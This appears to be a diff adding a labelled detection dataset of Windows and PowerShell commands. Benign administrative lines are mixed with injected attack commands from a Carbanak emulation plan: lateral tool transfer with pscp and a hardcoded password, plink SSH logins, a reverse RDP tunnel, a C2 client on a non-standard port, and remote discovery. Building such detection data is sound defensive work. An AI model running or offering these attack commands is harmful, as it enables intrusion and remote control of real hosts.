@@ -1,0 +1,29 @@
+C:\\Users\\kmitnick.financial\\AppData\\Roaming\\TransbaseOdbcDriver\\pscp.exe -scp -pw \"79a&LbjM@MlW8XZa\" C:\\Users\\kmitnick.financial\\AppData\\Roaming\\TransbaseOdbcDriver\\psexec.py kmitnick@10.0.0.7:/tmp/psexec.py;
+C:\\Users\\kmitnick.financial\\AppData\\Roaming\\TransbaseOdbcDriver\\pscp.exe -scp -pw \"79a&LbjM@MlW8XZa\" C:\\Users\\kmitnick.financial\\AppData\\Roaming\\TransbaseOdbcDriver\\runtime kmitnick@10.0.0.7:/tmp/runtime;
+C:\\Users\\kmitnick.financial\\AppData\\Roaming\\TransbaseOdbcDriver\\pscp.exe -scp -pw \"79a&LbjM@MlW8XZa\" C:\\Users\\kmitnick.financial\\AppData\\Roaming\\TransbaseOdbcDriver\\tiny.exe kmitnick@10.0.0.7:/tmp/tiny; // GROUND-TRUTH : T1570: Lateral Tool Transfer (lateral-movement) -- INJECTED APT-TECHNIQUE-COMMAND from - Carbanak Emulation-Plan -- Default args
+Test-Connection -ComputerName '192.168.1.1' -Count 3 -Quiet     // LABEL: BENIGN-POWERSHELL-COMMAND
+C:\\Users\\kmitnick.financial\\AppData\\Roaming\\TransbaseOdbcDriver\\plink.exe kmitnick@10.0.0.7 -pw 79a&LbjM@MlW8XZa  // GROUND-TRUTH : T1021.004: Remote Services: SSH (lateral-movement) -- INJECTED APT-TECHNIQUE-COMMAND from - Carbanak Emulation-Plan -- Default args
+Get-ChildItem C:\ -Recurse | Out-File C:\ScriptLog.txt     // LABEL: BENIGN-POWERSHELL-COMMAND
+Move-Item tiny.exe C:\Windows\tiny.exe;
+C:\Windows\tiny.exe 192.168.0.4 8080     // GROUND-TRUTH : T1571: Non-Standard Port (command-and-control) -- INJECTED APT-TECHNIQUE-COMMAND from - Carbanak Emulation-Plan
+$env:TEMP | ForEach-Object { $_.FullName } | Sort-Object -Unique | Remove-Item -Force     // LABEL: BENIGN-POWERSHELL-COMMAND
+Set-ExecutionPolicy Unrestricted     // LABEL: BENIGN-POWERSHELL-COMMAND
+Set-ExecutionPolicy Unrestricted -Scope Process -Force -Verbose     // LABEL: BENIGN-POWERSHELL-COMMAND
+New-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\' -Name 'ExecutionPolicy' -Value 'Unrestricted' -PropertyType 'String' -Force -ErrorAction SilentlyContinue     // LABEL: BENIGN-POWERSHELL-COMMAND
+Get-Content C:\Reports\MonthlyReport.txt | Format-List -Property Path,Modified,Length -Verbose     // LABEL: BENIGN-POWERSHELL-COMMAND
+Test-Path C:\Windows     // LABEL: BENIGN-POWERSHELL-COMMAND
+Get-ADUser -Filter {Name -like 'J*'} -Properties Enabled | Export-Csv 'C:\ADUsers.csv' -NoTypeInformation     // LABEL: BENIGN-POWERSHELL-COMMAND
+Copy-Item -Path 'C:\Windows\System32\LogFiles\*' -Destination 'C:\Backup\System32' -Recurse -Force -ErrorAction SilentlyContinue     // LABEL: BENIGN-POWERSHELL-COMMAND
+Get-ADComputer -Identity 'cfo' -Properties *     // GROUND-TRUTH : T1018: Remote System Discovery (discovery) -- INJECTED APT-TECHNIQUE-COMMAND from - Carbanak Emulation-Plan
+Copy-Item C:\Windows\System32\*.* C:\Backup -Recurse -Force -ErrorAction SilentlyContinue     // LABEL: BENIGN-POWERSHELL-COMMAND
+Test-Path -Path 'C:\Windows\System32\drivers\etc\hosts'     // LABEL: BENIGN-POWERSHELL-COMMAND
+Move-Item plink.exe C:\\Windows\\Temp\\plink.exe;
+echo n | C:\\Windows\\Temp\\plink.exe -pw "azsxdcAZSXDC123" alfred@192.168.0.4 -R 3389:localhost:3389   // GROUND-TRUTH : T1572: Protocol Tunneling (command-and-control) -- INJECTED APT-TECHNIQUE-COMMAND from - Carbanak Emulation-Plan -- Default args
+Copy-Item C:\Windows\System32\drivers\*.sys C:\Backup -Recurse     // LABEL: BENIGN-POWERSHELL-COMMAND
+Get-ChildItem C:\ -Recurse | Out-File C:\ScriptLog.txt     // LABEL: BENIGN-POWERSHELL-COMMAND
+qwinsta /server:cfo     // GROUND-TRUTH : T1033: System Owner/User Discovery (discovery) -- INJECTED APT-TECHNIQUE-COMMAND from - Carbanak Emulation-Plan
+Set-ExecutionPolicy Bypass -Scope Process -Force     // LABEL: BENIGN-POWERSHELL-COMMAND
+Copy-Item C:\Logs\*.log C:\Backup\Logs -Recurse -Force     // LABEL: BENIGN-POWERSHELL-COMMAND
+New-Item C:\temp\script.ps1 -Type File -Force     // LABEL: BENIGN-POWERSHELL-COMMAND
+Get-ItemProperty -Path HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name DisableTaskMgr -ErrorAction SilentlyContinue | ForEach-Object { if ($_.DisableTaskMgr -eq 1) { Write-Output 'Task Manager can be disabled.' } else { Write-Output 'Task Manager cannot be disabled.' } }     // LABEL: BENIGN-POWERSHELL-COMMAND
+Invoke-Sqlcmd -Query 'SELECT * FROM Users' -Database 'MyDB' -ServerInstance 'localhost'     // LABEL: BENIGN-POWERSHELL-COMMAND
